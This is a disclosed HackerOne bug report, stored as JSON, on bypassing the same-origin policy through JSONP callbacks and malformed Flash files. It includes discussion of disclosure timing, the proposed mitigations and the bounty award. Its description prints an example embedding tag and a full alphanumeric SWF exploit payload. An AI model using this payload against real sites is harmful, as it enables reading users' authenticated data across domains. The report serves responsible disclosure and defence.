{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2014-07-19T13:03:05.495Z", 
    "voters": [
        "tarwadahorse", 
        "zeroknife", 
        "flexorium"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "3000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 10373, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2014-07-19T17:32:21.959Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Bypassing Same Origin Policy With JSONP APIs and Flash", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2014-08-18T13:03:05.798Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$3,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-04-30T07:51:32.086Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-30T07:51:32.086Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "It seems like newlines are significant in HackerOne's Markdown formatter,  and that messed up formatting. Sorry for that, but I see no way to edit the original description :/ ", 
            "markdown_message": "<p>It seems like newlines are significant in HackerOne&#39;s Markdown formatter,  and that messed up formatting. Sorry for that, but I see no way to edit the original description :/ </p>\n", 
            "type": "Activities::Comment", 
            "id": 41994, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-03T13:59:34.403Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-03T13:59:34.403Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "An update regarding Alok Menghrajani's related work after exchanging a few emails with him: it is not clear from the notes on the website, but in the end, he didn't manage to escalate access into making HTTP request on behalf of the affected domains (where the callback filter was [\\x01-\\0x7F]).", 
            "markdown_message": "<p>An update regarding Alok Menghrajani&#39;s related work after exchanging a few emails with him: it is not clear from the notes on the website, but in the end, he didn&#39;t manage to escalate access into making HTTP request on behalf of the affected domains (where the callback filter was [\\x01-\\0x7F]).</p>\n", 
            "type": "Activities::Comment", 
            "id": 43782, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-06T07:53:24.757Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-06T07:53:24.757Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "Please let me know if it would make more sense to resubmit this as a joint work of Alok and me, as our work is complementary: he discovered a novel theoretical attack, and I presented an extended version that is not only practical, but also affects large number of sites.", 
            "markdown_message": "<p>Please let me know if it would make more sense to resubmit this as a joint work of Alok and me, as our work is complementary: he discovered a novel theoretical attack, and I presented an extended version that is not only practical, but also affects large number of sites.</p>\n", 
            "type": "Activities::Comment", 
            "id": 44714, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-14T18:36:11.257Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-14T18:36:11.257Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "@molnarg - Please accept my apologies for the inexcusable delay here. This looks like something the IBB panel would consider for a reward, given the novelty along with the significant number of vulnerable web properties you've identified. Have you already begun notifying the affected sites? If not, do you have a timeline for doing so? We should try to coordinate any reward here with most of those sites having sufficient time to patch.", 
            "markdown_message": "<p><a href=\"/molnarg\">@molnarg</a> - Please accept my apologies for the inexcusable delay here. This looks like something the IBB panel would consider for a reward, given the novelty along with the significant number of vulnerable web properties you&#39;ve identified. Have you already begun notifying the affected sites? If not, do you have a timeline for doing so? We should try to coordinate any reward here with most of those sites having sufficient time to patch.</p>\n", 
            "type": "Activities::Comment", 
            "id": 50929, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-14T19:54:56.091Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-14T19:54:56.091Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "Thanks for moving this issue forward!\n\nAt first, I did not realise how widespread this issue was, and I've notified two sites: Shopify and PayPal. Shopify patched this quickly, but PayPal did not yet respond to my report. I guess I should contact them again and ask to not publish any info about this until at least most of the high profile sites are fixed.\n\nAre you sure the best approach would be notifying sites and fixing these holes one by one? The other way would be **notifying Adobe and ask for a fix in Flash**. Or, as Alok suggested to me, **browsers could refuse loading the JSONP response as Flash when the Content-Type header explicitly states that this is not Flash content** at all. Unfortunately, the current behaviour is [standardised in HTML5](http://www.w3.org/TR/html5/embedded-content-0.html#the-object-element) and I doubt this issue would be enough to change the standard.\n\nI have no timeline in mind yet, and no serious experience in coordinating this kind of stuff. Could you recommend a reasonable timeline?\n\n", 
            "markdown_message": "<p>Thanks for moving this issue forward!</p>\n\n<p>At first, I did not realise how widespread this issue was, and I&#39;ve notified two sites: Shopify and PayPal. Shopify patched this quickly, but PayPal did not yet respond to my report. I guess I should contact them again and ask to not publish any info about this until at least most of the high profile sites are fixed.</p>\n\n<p>Are you sure the best approach would be notifying sites and fixing these holes one by one? The other way would be <strong>notifying Adobe and ask for a fix in Flash</strong>. Or, as Alok suggested to me, <strong>browsers could refuse loading the JSONP response as Flash when the Content-Type header explicitly states that this is not Flash content</strong> at all. Unfortunately, the current behaviour is <a href=\"/redirect?signature=4c56e68b93bd7f7a3f3b14b86136598a38a42757&amp;url=http%3A%2F%2Fwww.w3.org%2FTR%2Fhtml5%2Fembedded-content-0.html%23the-object-element\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>standardised in HTML5</span><i class=\"icon-external-link\"></i></a> and I doubt this issue would be enough to change the standard.</p>\n\n<p>I have no timeline in mind yet, and no serious experience in coordinating this kind of stuff. Could you recommend a reasonable timeline?</p>\n", 
            "type": "Activities::Comment", 
            "id": 51021, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-06-04T09:43:35.734Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-04T09:43:35.734Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "I would be happy to contact Adobe as a first step, but I guess you have a better contact with them through HackerOne. What do you think?\n\nAlso, if they don't want to break backwards compatibility because of this, how about contacting top sites and giving a final disclosure date around 4 months from now? That should be enough for everybody to fix this.", 
            "markdown_message": "<p>I would be happy to contact Adobe as a first step, but I guess you have a better contact with them through HackerOne. What do you think?</p>\n\n<p>Also, if they don&#39;t want to break backwards compatibility because of this, how about contacting top sites and giving a final disclosure date around 4 months from now? That should be enough for everybody to fix this.</p>\n", 
            "type": "Activities::Comment", 
            "id": 66210, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-05T10:46:02.266Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-05T10:46:02.266Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "There's a conference CFP deadline on 13th July (Hacktivity, a hungarian conference) and I'd like to apply with a talk about JSONP security, and with this specific issue. The conference itself is on 10th and 11th of October.\n\nBefore I apply, I'd like to hear wether you guys think the final disclosure date of 10th of October would be reasonable for this issue.", 
            "markdown_message": "<p>There&#39;s a conference CFP deadline on 13th July (Hacktivity, a hungarian conference) and I&#39;d like to apply with a talk about JSONP security, and with this specific issue. The conference itself is on 10th and 11th of October.</p>\n\n<p>Before I apply, I&#39;d like to hear wether you guys think the final disclosure date of 10th of October would be reasonable for this issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 84697, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-08T18:06:38.586Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-08T18:06:38.586Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/", 
            "markdown_message": "<p><a title=\"http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/\" href=\"/redirect?signature=9f0a80b4c5ceaadb59fb435df50721b2c15cc605&amp;url=http%3A%2F%2Fmiki.it%2Fblog%2F2014%2F7%2F8%2Fabusing-jsonp-with-rosetta-flash%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 86167, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-08T19:03:10.690Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-08T19:03:10.690Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "It looks like Adobe has a partial mitigation landing in APSB14-17, potentially from a parallel discovery. Did you end up contacting Adobe PSIRT directly? Either way, the details and mitigation are public now and I'll put this up to the panel for a bounty vote.", 
            "markdown_message": "<p>It looks like Adobe has a partial mitigation landing in APSB14-17, potentially from a parallel discovery. Did you end up contacting Adobe PSIRT directly? Either way, the details and mitigation are public now and I&#39;ll put this up to the panel for a bounty vote.</p>\n", 
            "type": "Activities::Comment", 
            "id": 86222, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-08T19:20:57.714Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-08T19:21:37.865Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "They were contacted by Michele Spagnuolo from Google who discovered this in parallel. See his blog post here: http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/", 
            "markdown_message": "<p>They were contacted by Michele Spagnuolo from Google who discovered this in parallel. See his blog post here: <a title=\"http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/\" href=\"/redirect?signature=9f0a80b4c5ceaadb59fb435df50721b2c15cc605&amp;url=http%3A%2F%2Fmiki.it%2Fblog%2F2014%2F7%2F8%2Fabusing-jsonp-with-rosetta-flash%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 86238, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-08T19:21:59.031Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-08T19:21:59.031Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "Thanks for putting it up for a vote.", 
            "markdown_message": "<p>Thanks for putting it up for a vote.</p>\n", 
            "type": "Activities::Comment", 
            "id": 86240, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-08T20:36:24.664Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-08T20:36:24.664Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "It turns out after looking at Michele's code that he used my algorithms and exact Huffman tables from https://github.com/molnarg/ascii-zip . He even acknowledged it in the CREDITS file: https://github.com/mikispag/rosettaflash/blob/master/CREDITS", 
            "markdown_message": "<p>It turns out after looking at Michele&#39;s code that he used my algorithms and exact Huffman tables from <a title=\"https://github.com/molnarg/ascii-zip\" href=\"/redirect?signature=9be1e5765cbd007eb34265d99e9d02d6e3231fed&amp;url=https%3A%2F%2Fgithub.com%2Fmolnarg%2Fascii-zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/molnarg/ascii-zip</span><i class=\"icon-external-link\"></i></a> . He even acknowledged it in the CREDITS file: <a title=\"https://github.com/mikispag/rosettaflash/blob/master/CREDITS\" href=\"/redirect?signature=b5918a23d4b2101ece7510ee908512d657fbb829&amp;url=https%3A%2F%2Fgithub.com%2Fmikispag%2Frosettaflash%2Fblob%2Fmaster%2FCREDITS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mikispag/rosettaflash/blob/master/CREDITS</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 86270, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "molnarg", 
                "url": "/molnarg"
            }, 
            "created_at": "2014-07-18T23:44:44.626Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-18T23:44:44.626Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 91777, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2014-07-18T23:45:03.061Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-18T23:45:03.061Z", 
            "actor": {
                "url": "/internet", 
                "profile": {
                    "name": "The Internet"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/38e952fcff2c0aae0d011d5cecd07e5f62ecbd63_medium.png?1383767658"
                }
            }, 
            "team_handle": "internet", 
            "bounty_amount": "3000.0", 
            "collaborator": {
                "username": "molnarg", 
                "url": "/molnarg"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 91778, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-19T13:03:05.516Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-19T13:03:05.516Z", 
            "actor": {
                "username": "molnarg", 
                "url": "/molnarg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "first_to_agree": true, 
            "message": "Thanks!", 
            "markdown_message": "<p>Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 91965, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-19T17:32:21.977Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-19T17:32:21.977Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 92015, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-19T17:32:22.275Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-19T17:32:22.275Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "internet", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 92016, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "molnarg", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/molnarg", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -135770481.02203256, 
    "disclosed_at": "2014-07-19T17:32:22.258Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/10373", 
    "created_at": "2014-04-29T23:54:14.670Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"overview\">Overview</h1>\n\n<p>This is a new type of web vulnerability that is made possible by two seemingly unrelated things:</p>\n\n<ul>\n<li>the way JSONP APIs work</li>\n<li>the way Flash handles malformed SWF files</li>\n</ul>\n\n<p>and has an effect and limitations similar to XSS flaws:</p>\n\n<ul>\n<li>the user has to visit a website set up by the attacker in order to trigger the vulnerability</li>\n<li>as a result, the attacker can make arbitrary HTTP request to the vulnerable domain (with the user&#39;s cookies sent along with the request) and read the responses</li>\n</ul>\n\n<h1 id=\"description\">Description</h1>\n\n<p>[JSONP] APIs return JSON data wrapped by an invocation of a callback function specified by the caller.  The caller first defines a JavaScript function and then injects a script tag with the JSON API URL as if it were a JavaScript file to load. JSONP APIs became popular because making JSONP requests are is not forbidden by the Same Origin Policy.</p>\n\n<p>From the point of view of this discussion, the important part is that <strong>the first bytes of the response can be controlled by a GET parameter</strong> (typically named callback).</p>\n\n<p>If an attacker can create a Flash file, that can be passed as callback parameter to a JSONP API, and passes the filters applied to the callback name, then she is able to load this Flash file in the security context of the JSONP API&#39;s domain (the target domain). After the Flash file is loaded, she can make HTTP requests through it to the target domain in the name of the user.</p>\n\n<p>Example:</p>\n<pre class=\"highlight plaintext\"><code>&lt;object type=&quot;application/x-shockwave-flash&quot;\n        data=&quot;http://example.com/jsonp-api?callback=__URL_ENCODED_SWF__&quot;&gt;\n  &lt;param name=&quot;AllowScriptAccess&quot; value=&quot;always&quot;&gt;\n&lt;/object&gt;\n</code></pre>\n<p>The response to the HTTP request:</p>\n<pre class=\"highlight plaintext\"><code>__SWF_FILE__({&quot;actual&quot;: &quot;API&quot;, &quot;response&quot;: 15})\n</code></pre>\n<p>There is two significant problems that have to be solved by an attacker:</p>\n\n<ol>\n<li>the end of the response is the actual JSON API response, and that makes the response as a whole an invalid SWF file.</li>\n<li>callback names are almost always filtered, forcing the callback parameter into the [A-Za-z0-9] range</li>\n</ol>\n\n<p>The first problem is in fact solved by the way <strong>Flash</strong> handles invalid SWF files: it <strong>ignores additional bytes at the end of an otherwise valid Flash file</strong>.</p>\n\n<p>The second problem turns out to be solvable too. The SWF file format specifies a way to compress the whole file (except an 8 byte header) as a DEFLATE stream. <strong>It is possible to create a DEFLATE stream in the [A-Za-z0-9] character range for arbitrary binary data.</strong> (As proven by my [ascii-zip] project)</p>\n\n<p>As a demonstration, I&#39;ve created a Flash file in the given character range that can load an arbitrary SWF file given by the embedder site (the attacker website) into it&#39;s security context (the target domain&#39;s security context):</p>\n<pre class=\"highlight plaintext\"><code>CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH\n</code></pre>\n<p>The embedder site can specify the SWF to load through the &quot;name&quot; property of the object tag. The specified SWF file could be a [cross domain proxy] that can make HTTP requests for the embedder site.</p>\n\n<h1 id=\"related-work\">Related work</h1>\n\n<p>This attack is inspired by Alok Menghrajani&#39;s [related work], where he showed that it is possible to assemble a Flash file in the [\\x01-\\0x7F] byte range to prove that certain JSONP endpoints are not secure.</p>\n\n<p>The real contribution of my work is the demonstration of the fact that this attack is also feasible in the [A-Za-z0-9] character range. This is critical because overwhelming majority of the JSONP endpoints only accept this character range in the callback name.</p>\n\n<h1 id=\"mitigation\">Mitigation</h1>\n\n<p>Limiting the callback name length is not a good solution, as there is no strong guarantee that it is not possible to come up with an SWF file that conforms to this tightened filter.</p>\n\n<p>The API maintainer can mitigate this type of attack by <strong>putting an empty JavaScript callback in front of the callback name in the repsonse</strong>. This makes it impossible to control the first bytes of the response.</p>\n\n<p>An other protection would be <strong>hosting JSONP APIs on a sandbox domain</strong>. The latter solution is only effective if there&#39;s no crossdomain.xml rule that would allow requests from the sandbox domain to the main domain.</p>\n\n<p>A proper solution would be <strong>changing the way Flash handles malformed SWF files so that it won&#39;t files with additional data at the end of the SWF file</strong>.</p>\n\n<p>Although one of the mitigations is fixing Flash, I don&#39;t consider this a Flash vulnerability, as an affected site does not even have to use the Flash technology in order to be vulnerable.</p>\n\n<h1 id=\"affected-sites\">Affected sites</h1>\n\n<p>I&#39;ve tested the 35 top websites on Wikipedia&#39;s (somewhat out of date) copy of the Alexa <a href=\"/redirect?signature=8fe5884f3377a0223e7e8ac155453fd3d5f5d327&amp;url=http%3A%2F%2Fen.wikipedia.org%2Fwiki%2FList_of_most_popular_websites\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>toplist</span><i class=\"icon-external-link\"></i></a> (after unifying <a href=\"/redirect?signature=45f17e6a79010b2ff46a095b1320c62be454ffe0&amp;url=http%3A%2F%2Fwww.google.%2A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.google.*</span><i class=\"icon-external-link\"></i></a> domains into a single entry), and 16 (~45%) of them proved to be vulnerable.</p>\n\n<p>The unaffected sites fall into the following categories:</p>\n\n<ul>\n<li>Sites that simply don&#39;t have any JSONP API.</li>\n<li>Google and Facebook: JSONP answers from these sites begin with empty JavaScript comments (probably because they are being extremely cautious and implemented this protection after the publication of Alok Menghrajani&#39;s [related work]).</li>\n<li>Sites that host all JSONP APIs on a different domain (this is considered as a best practice) and don&#39;t have crossdomain.xml rule on the main site that enables cross domain requests from the API domain.</li>\n<li>A single site limits the callback name length to 50 characters.</li>\n</ul>\n\n<h1 id=\"demo\"><a href=\"/redirect?signature=f1354ee52e946f87c2156751f7e474b6295ebf65&amp;url=https%3A%2F%2Fgabor.molnar.es%2Fbb%2F9bfb0835d1e72705bb374132c4d2cb3e9a4417e91b9be31a074fb7d644b34988%2Foctameter.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>DEMO</span><i class=\"icon-external-link\"></i></a></h1>\n\n<p>JSONP: <a title=\"http://json-p.org/\" href=\"/redirect?signature=6d712b583bd265dcabd55930728581ed14c0a737&amp;url=http%3A%2F%2Fjson-p.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://json-p.org/</span><i class=\"icon-external-link\"></i></a><br>\nascii-zip: <a title=\"https://github.com/molnarg/ascii-zip\" href=\"/redirect?signature=9be1e5765cbd007eb34265d99e9d02d6e3231fed&amp;url=https%3A%2F%2Fgithub.com%2Fmolnarg%2Fascii-zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/molnarg/ascii-zip</span><i class=\"icon-external-link\"></i></a><br>\ncross domain proxy: <a title=\"https://github.com/borisreitman/CrossXHR\" href=\"/redirect?signature=a1aacb2a1d6946e45a82297638466eaf0c6b72f4&amp;url=https%3A%2F%2Fgithub.com%2Fborisreitman%2FCrossXHR\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/borisreitman/CrossXHR</span><i class=\"icon-external-link\"></i></a><br>\nrelated work: <a title=\"http://quaxio.com/jsonp_handcrafted_flash_files/\" href=\"/redirect?signature=cff317ab529e6e0749a4e2fa47fbb0e950f5d820&amp;url=http%3A%2F%2Fquaxio.com%2Fjsonp_handcrafted_flash_files%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://quaxio.com/jsonp_handcrafted_flash_files/</span><i class=\"icon-external-link\"></i></a><br>\ntoplist: <a title=\"http://en.wikipedia.org/wiki/List_of_most_popular_websites\" href=\"/redirect?signature=8fe5884f3377a0223e7e8ac155453fd3d5f5d327&amp;url=http%3A%2F%2Fen.wikipedia.org%2Fwiki%2FList_of_most_popular_websites\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://en.wikipedia.org/wiki/List_of_most_popular_websites</span><i class=\"icon-external-link\"></i></a></p>\n", 
